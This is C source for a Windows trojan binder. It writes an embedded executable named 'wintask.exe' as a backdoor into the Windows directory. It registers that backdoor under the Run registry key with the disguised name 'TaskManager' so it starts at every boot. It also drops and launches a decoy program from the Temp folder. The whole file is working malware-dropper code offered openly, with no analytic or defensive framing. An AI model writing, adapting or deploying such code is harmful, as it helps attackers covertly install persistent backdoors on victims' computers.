

/* bind.c -- simple binder program */


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <windows.h>

/* 
 * Include binded files
 *
 * Binded files are presented as a C strings, for example
 *
 * program1.h:
 *
 * const char program1[] = {
 * 0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
 * 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
 * 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 * 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 * .....
 * 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 * 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 *
 * program2.h:
 *
 * const char program2[] = ....
 *
 *
 */

#include "program1.h"
#include "program2.h"

/* Filenames */

#define	BACKDOOR	"wintask.exe"
#define PROGRAM		"tmp.exe"

int 
WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
	FILE 			*st;
	STARTUPINFO 		si;
	PROCESS_INFORMATION 	pi;
	char			*windir;
	char			file[1024], temp[1024];
	HKEY 			Result;
	LONG 			Return;
	

	/* Get environment variables */
	windir = getenv("windir");
	if (windir == NULL)
		windir = "C:\\";

	/* Write binary image to disk */
	memset(file, sizeof(file), 0);
	_snprintf(file, sizeof(file), "%s\\%s", windir, BACKDOOR);
        st = fopen(file, "wb");
	if (st != NULL) {
		fwrite(program1, sizeof(program1), 1, st);
		fclose(st);
	} else {
		/* Write not successful, try temp */
		memset(file, sizeof(file), 0);
		_snprintf(file, sizeof(file), "%s\\Temp\\%s", windir, BACKDOOR);
        	st = fopen(file, "wb");
		if (st != NULL) {
			fwrite(program1, sizeof(program1), 1, st);
			fclose(st);
		} else
			exit (1);
	}

	/* Write trojaned file to temp dir: */
	memset(temp, sizeof(temp), 0);
	_snprintf(temp, sizeof(temp), "%s\\Temp\\%s", windir, PROGRAM);
	st = fopen(temp, "wb");
	if (st != NULL) {
		fwrite(program2, sizeof(program2), 1, st);
		fclose(st);
	} else
		exit (1);
	
	/* Register trojan for next boot */
	Return = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
		TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
		KEY_WRITE, &Result);

	if (Return == ERROR_SUCCESS) {
		Return = RegSetValueEx(Result, "TaskManager",
			0, REG_SZ, file, strlen(file));

		if (Return != ERROR_SUCCESS) {
			RegCloseKey(Result);
			Return = RegOpenKeyEx(HKEY_CURRENT_USER, 
				TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
				KEY_READ, &Result);
		
			if (Return == ERROR_SUCCESS) {
				Return = RegSetValueEx(Result, "TaskManager",
					0, REG_SZ, file, strlen(file));
				if (Return != ERROR_SUCCESS) {
					exit (1);
				}
			}
		}
		
	} else
		exit (1);
	RegCloseKey(Result);
	
	
	/* Run and delete the trojaned program */

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	/* si.wShowWindow = SW_HIDE; */

	CreateProcess( NULL, temp, NULL,
		NULL, FALSE, 0, NULL, NULL, &si, &pi);

	/* _unlink(temp); */

}
